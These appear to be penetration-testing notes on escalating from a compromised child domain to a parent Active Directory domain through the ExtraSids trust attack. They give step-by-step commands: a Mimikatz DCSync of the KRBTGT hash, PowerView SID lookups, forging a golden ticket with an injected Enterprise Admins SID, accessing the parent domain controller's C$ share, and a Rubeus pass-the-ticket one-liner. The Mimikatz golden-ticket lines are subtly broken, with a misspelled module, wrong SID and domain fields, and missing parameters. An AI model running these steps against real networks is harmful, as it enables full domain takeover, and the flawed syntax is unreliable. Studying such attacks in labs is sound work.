Their are different Cross Domain attack we can perform, below are some Domain Trust attack that utilize child -> parent path and cross forest trust abuse

ExtraSids Attack:

After we compromised the child domain, if, due to misconfiguration (lack of SID filtering in place), what we can do is we add Enterprise Admin group SID into the child domain's account, and since lack of SID Filtering, it would be respected at the parent domain the treat us as Enterprise Admin.

The following is needed to carryon this attack:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.
(Note: This requires a compromise of the child domain, do not attempt if you did not compromise the domain as you would be stuck at first step - obtaining KRBTGT hash)

-Dumping KRBTGT Account's NT Hash with mimikatz:
```
mimikatz.exe
privilege::debug
lsadump::dcsync /user:<domain>\krbtgt #Mark down the hashes
#This specific line tell us the FQDN name of the child domain
[DC] '<domainfqdnname>' will be the domain

```

-Getting the child domain SID with PowerView:
```
Get-DomainSID
```

-Get SID of Enterprise Admins groups in parent domain using PowerView:
```
Get-DomainGroup -Domain <parentdomainname> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

We also need to designate a target username (does not need to be real), in example we would be using NJohn

We first craft us a golden ticket with mimikatz:
```
mimikatz.exe
privilege::debug
kerboros::golden /user: NJohn /domain:<parentdomainfqdnname> /sid:<enterpriseadminsid> /
#Example:
kerberos::golden /user:NJohn /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /
```

We then use klist to confirm the existence of the crafted golden ticket in our current session

If the ticket exist, we then have complete control over the parent domain, we can try listing domain controller C drive to validate, or we can proceed to perform a DCSync Attack:
```
#Example
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Lastly, we can perform this attack by using rubeus as well

```
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<domainfqdn> /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```